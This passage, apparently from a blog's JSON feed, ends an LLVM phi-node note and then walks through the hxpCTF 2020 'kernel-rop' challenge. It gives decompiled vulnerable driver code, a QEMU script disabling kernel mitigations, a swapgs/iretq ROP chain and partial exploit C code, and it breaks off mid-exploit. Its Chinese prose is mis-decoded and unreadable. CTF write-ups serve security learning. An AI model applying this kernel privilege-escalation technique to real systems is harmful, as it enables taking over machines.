class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">define i32 @max(i32 %a, i32 %b) &#123;</span><br><span class=\"line\">entry:</span><br><span class=\"line\">  %<span class=\"number\">0</span> = icmp sgt i32 %a, %b</span><br><span class=\"line\">  br i1 %<span class=\"number\">0</span>, label %btrue, label %bfalse</span><br><span class=\"line\"></span><br><span class=\"line\">btrue:                                      ; preds = %<span class=\"number\">2</span></span><br><span class=\"line\">  br label %end</span><br><span class=\"line\"></span><br><span class=\"line\">bfalse:                                     ; preds = %<span class=\"number\">2</span></span><br><span class=\"line\">  br label %end</span><br><span class=\"line\"></span><br><span class=\"line\">end:                                     ; preds = %btrue, %bfalse</span><br><span class=\"line\">  %retval = phi i32 [%a, %btrue], [%b, %bfalse]</span><br><span class=\"line\">  ret i32 %retval</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ä¾æ®æ§åˆ¶æµåˆ†æ”¯é€‰æ‹©å˜é‡ã€‚</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">llc -O0 -filetype=asm test.ll</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># %bb<span class=\"number\">.0</span>:                                # %entry</span><br><span class=\"line\">\tcmpl\t%esi, %edi</span><br><span class=\"line\">\tmovl\t%edi, <span class=\"number\">-4</span>(%rsp)          # <span class=\"number\">4</span>-byte Spill</span><br><span class=\"line\">\tmovl\t%esi, <span class=\"number\">-8</span>(%rsp)          # <span class=\"number\">4</span>-byte Spill</span><br><span class=\"line\">\tjle\t.LBB0_2</span><br><span class=\"line\"># %bb<span class=\"number\">.1</span>:                                # %btrue</span><br><span class=\"line\">\tmovl\t<span class=\"number\">-4</span>(%rsp), %eax          # <span class=\"number\">4</span>-byte Reload</span><br><span class=\"line\">\tmovl\t%eax, <span class=\"number\">-12</span>(%rsp)         # <span class=\"number\">4</span>-byte Spill</span><br><span class=\"line\">\tjmp\t.LBB0_3</span><br><span class=\"line\">.LBB0_2:                                # %bfalse</span><br><span class=\"line\">\tmovl\t<span class=\"number\">-8</span>(%rsp), %eax          # <span class=\"number\">4</span>-byte Reload</span><br><span class=\"line\">\tmovl\t%eax, <span class=\"number\">-12</span>(%rsp)         # <span class=\"number\">4</span>-byte Spill</span><br><span class=\"line\">\tjmp\t.LBB0_3</span><br><span class=\"line\">.LBB0_3:                                # %end</span><br><span class=\"line\">\tmovl\t<span class=\"number\">-12</span>(%rsp), %eax         # <span class=\"number\">4</span>-byte Reload</span><br><span class=\"line\">\tretq</span><br></pre></td></tr></table></figure>\n<p>æ±‡ç¼–é‡Œæ˜¯å®ç°å°±æ˜¯æ¯ä¸€æ¡åˆ†æ”¯éƒ½å¾€ <code>-12(%rsp)</code>  ä¸Šæ”¾ç½®æ•°æ®ï¼Œç„¶å end åˆ†æ”¯è¯»å–ã€‚</p>\n",
            "tags": [
                "llvm"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/09/29/hexp-2020-kernel-rop/",
            "url": "https://squirre17.github.io/2022/09/29/hexp-2020-kernel-rop/",
            "title": "hexp-2020-kernel-rop",
            "date_published": "2022-09-29T14:53:15.000Z",
            "content_html": "<p><a href=\"https://2020.ctf.link/\">Challenges</a><br>\nhxpCTF 2020 kernel-rop<br>\n å·²ç»åŒæ­¥åˆ° gittee</p>\n<p>å…ˆè¯»å–å‡º init çš„æ–‡ä»¶ç³»ç»Ÿ</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gunzip initramfs.cpio.gz</span><br><span class=\"line\">mv vmlinuz vmlinux</span><br></pre></td></tr></table></figure>\n<p>è®¾ç½® inittab ä¸­ sh æƒé™ä¸º root</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setuidgid 0000 sh</span><br></pre></td></tr></table></figure>\n<h1 id=\"hackmeso\"><a class=\"markdownIt-Anchor\" href=\"#hackmeso\">#</a> <a href=\"http://hackme.so\">hackme.so</a></h1>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> __fastcall <span class=\"title function_\">hackme_write</span><span class=\"params\">(file *f, <span class=\"type\">const</span> <span class=\"type\">char</span> *data, <span class=\"type\">size_t</span> size, <span class=\"type\">loff_t</span> *off)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v4; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> size_1; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> tmp[<span class=\"number\">32</span>]; <span class=\"comment\">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v8; <span class=\"comment\">// [rsp+80h] [rbp-20h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  size_1 = v4;</span><br><span class=\"line\">  v8 = __readgsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v4 &gt; <span class=\"number\">0x1000</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    _warn_printk(<span class=\"string\">&quot;Buffer overflow detected (%d &lt; %lu)!\\n&quot;</span>, <span class=\"number\">4096LL</span>, v4);</span><br><span class=\"line\">    BUG();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  _check_object_size(hackme_buf, v4, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( copy_from_user(hackme_buf, data, size_1) )              [<span class=\"number\">1</span>] &lt;&lt;- ç”¨æˆ·cpæ•°æ®åˆ° hackme_buf</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-14LL</span>;</span><br><span class=\"line\">  _memcpy(tmp, hackme_buf);                                    [<span class=\"number\">2</span>] &lt;&lt;- æº¢å‡ºtmp</span><br><span class=\"line\">   <span class=\"keyword\">return</span> size_1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>å†çœ‹ read</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> __fastcall <span class=\"title function_\">hackme_read</span><span class=\"params\">(file *f, <span class=\"type\">char</span> *data, <span class=\"type\">size_t</span> size, <span class=\"type\">loff_t</span> *off)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v4; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 size_1; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> v6; <span class=\"comment\">// zf</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> tmp[<span class=\"number\">32</span>]; <span class=\"comment\">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v9; <span class=\"comment\">// [rsp+80h] [rbp-20h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _fentry__();</span><br><span class=\"line\">  size_1 = v4;</span><br><span class=\"line\">  v9 = __readgsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  _memcpy(hackme_buf, tmp);                    [<span class=\"number\">1</span>] &lt;&lt;- æ³¨æ„ tmpä¸‹é¢å°±æ˜¯canary å¯ä»¥æ³„æ¼</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size_1 &gt; <span class=\"number\">0x1000</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    _warn_printk(<span class=\"string\">&quot;Buffer overflow detected (%d &lt; %lu)!\\n&quot;</span>, <span class=\"number\">4096LL</span>, size_1);</span><br><span class=\"line\">    BUG();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  _check_object_size(hackme_buf, size_1, <span class=\"number\">1LL</span>);</span><br><span class=\"line\">  v6 = copy_to_user(data, hackme_buf, size_1) == <span class=\"number\">0</span>;</span><br><span class=\"line\">  result = <span class=\"number\">-14LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v6 )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> size_1;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"æ— smep-smap-kpti-kaslr\"><a class=\"markdownIt-Anchor\" href=\"#æ— smep-smap-kpti-kaslr\">#</a> æ—  SMEP SMAP KPTI KASLR</h1>\n<p>removing  <code>+smep</code> ,  <code>+smap</code> ,  <code>kpti=1</code> ,  <code>kaslr</code>  and adding  <code>nopti</code> ,  <code>nokaslr</code> .</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/sh</span></span><br><span class=\"line\">qemu-system-x86_64 \\</span><br><span class=\"line\">    -m 256M \\</span><br><span class=\"line\">    -cpu kvm64 \\</span><br><span class=\"line\">    -kernel ./vmlinux \\</span><br><span class=\"line\">    -initrd ./initrd.modified.cpio \\</span><br><span class=\"line\">    -snapshot \\</span><br><span class=\"line\">    -nographic \\</span><br><span class=\"line\">    -monitor /dev/null \\</span><br><span class=\"line\">    -no-reboot \\</span><br><span class=\"line\">    -append &quot;console=ttyS0 nokpti quiet panic=1 nokaslr&quot; \\</span><br><span class=\"line\">    -s</span><br></pre></td></tr></table></figure>\n<p>canary å’Œ tmp çš„è·ç¦»å¦‚ä¸‹ memcpy ä¸æ˜¯ 0 æˆªæ–­ rdx æ˜¯ç”± size ç»™åˆ°çš„</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-00000000000000</span>A0 tmp             dd <span class=\"number\">32</span> dup(?)</span><br><span class=\"line\"><span class=\"number\">-0000000000000020</span> anonymous_0     dq ?</span><br></pre></td></tr></table></figure>\n<p>æ–­åˆ°ç›®æ ‡ä½ç½® æˆªå– canary</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">â—  <span class=\"number\">0xffffffffc0000046</span>                  mov    rax, QWORD PTR gs:<span class=\"number\">0x28</span></span><br><span class=\"line\"> â†’ <span class=\"number\">0xffffffffc000004f</span>                  mov    QWORD PTR [rbp<span class=\"number\">-0x18</span>], rax</span><br><span class=\"line\"></span><br><span class=\"line\">gefâ¤  p/x $rax</span><br><span class=\"line\">$<span class=\"number\">1</span> = <span class=\"number\">0xbced0c8930859900</span></span><br></pre></td></tr></table></figure>\n<p>æ³„æ¼å‡ºäº† canary å æŸ¥çœ‹ write çš„æ±‡ç¼– å’Œ useland ä¸åŒçš„æ˜¯ è¿™é‡Œå¼¹äº†ä¸‰ä¸ªå¯„å­˜å™¨</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text.hackme_write:<span class=\"number\">00000000000000</span>A8                 pop     rbx</span><br><span class=\"line\">.text.hackme_write:<span class=\"number\">00000000000000</span>A9                 pop     r12</span><br><span class=\"line\">.text.hackme_write:<span class=\"number\">00000000000000</span>AB                 pop     rbp</span><br><span class=\"line\">.text.hackme_write:<span class=\"number\">00000000000000</span>AC                 retn</span><br></pre></td></tr></table></figure>\n<p>è‡³äºè¿™ä¸ªåç§»å¯ä»¥æ‰“å…¥ç‰¹æ®Šå€¼æ–­ç‚¹è°ƒè¯•<br>\næœ€ç»ˆè¦è°ƒç”¨ swapgs å’Œ iretq<br>\n æ ˆä¸Šè¦å¸ƒå±€äº”ä¸ªå¯„å­˜å™¨ (å‘ä¸‹é¢è¿™æ ·)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROP[i++] = a[SWAPGS_POP_RET];</span><br><span class=\"line\">ROP[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">ROP[i++] = a[IRETQ];</span><br><span class=\"line\">ROP[i++] = (u64)getshell;</span><br><span class=\"line\">ROP[i++] = user_cs;</span><br><span class=\"line\">ROP[i++] = user_flags;</span><br><span class=\"line\">ROP[i++] = user_sp;</span><br><span class=\"line\">ROP[i++] = user_ss;</span><br></pre></td></tr></table></figure>\n<p>ç”±äºè¿™é¢˜ååˆ†å¥‡æ€ª å„ä¸ªæ“ä½œçš„åŸºå€ä¸åœçš„åœ¨å˜åŒ– æ‰€ä»¥éœ€è¦é€šè¿‡åˆ«çš„é€”å¾„æ¥è·å–</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;include/head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> write_addr, read_addr;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getOpAddr</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;root get operation addr&quot;</span>);</span><br><span class=\"line\">    FILE * stream = popen(<span class=\"string\">&quot;cat /proc/kallsyms | grep hackme_write | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    assert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x20</span>];</span><br><span class=\"line\">    fread(buf, <span class=\"number\">0x10</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">    write_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;write_addr = 0x%lx&quot;</span>, write_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">    stream = popen(<span class=\"string\">&quot;cat /proc/kallsyms | grep hackme_read | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    assert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    fread(buf, <span class=\"number\">0x10</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">    read_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;read_addr = 0x%lx&quot;</span>, read_addr);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  getOpAddr();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ç„¶åæ ˆæº¢å‡ºçš„æ“ä½œæ¯”è¾ƒç®€å•</p>\n<ul>\n<li>åŠ«æŒ rip åˆ°ç”¨æˆ·å‡½æ•° å…ˆ cc (pkc) ææƒ</li>\n<li>å†è·³è½¬åˆ° å¸ƒå±€ç”¨æˆ·æ€å¯„å­˜å™¨ swapgs + iretq</li>\n<li>ä¸Šè¿°æ“ä½œçš„æ—¶å€™å¯ä»¥åŠ«æŒ rip è¿”å› getShell å‡½æ•°</li>\n</ul>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> u64;</span><br><span class=\"line\"><span class=\"type\">int</span> fd;</span><br><span class=\"line\">u64 write_addr, read_addr;</span><br><span class=\"line\">u64 user_cs,user_ss,user_sp,user_rflags;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveState</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  __asm__ __volatile__ (</span><br><span class=\"line\">    <span class=\"string\">&quot;mov %cs, user_cs;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov %ss, user_ss;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;pop user_rflags;&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;saveState&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">open_dev</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  fd = open(<span class=\"string\">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fd &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    Panic(<span class=\"string\">&quot;open_dev() failed&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;open_dev()&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// write to kernel</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">wtk</span><span class=\"params\">(<span class=\"type\">char</span> *buf, u64 size)</span>&#123;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;wtk start&quot;</span>);</span><br><span class=\"line\">  write(fd, buf, size);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;wtk&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// read from kernel</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">rfk</span><span class=\"params\">(<span class=\"type\">char</span> *buf, u64 size)</span>&#123;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;rfk start&quot;</span>);</span><br><span class=\"line\">  read(fd, buf, size);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;rfk&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getOpAddr</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;root get operation addr&quot;</span>);</span><br><span class=\"line\">    FILE * stream = popen(<span class=\"string\">&quot;cat /proc/kallsyms | grep hackme_write | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    assert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x20</span>];</span><br><span class=\"line\">    fread(buf, <span class=\"number\">0x10</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">    write_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;write_addr = 0x%lx&quot;</span>, write_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">    stream = popen(<span class=\"string\">&quot;cat /proc/kallsyms | grep hackme_read | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    assert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    fread(buf, <span class=\"number\">0x10</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">    read_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;read_addr = 0x%lx&quot;</span>, read_addr);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;getOpAddr&quot;</span>);</span><br><span 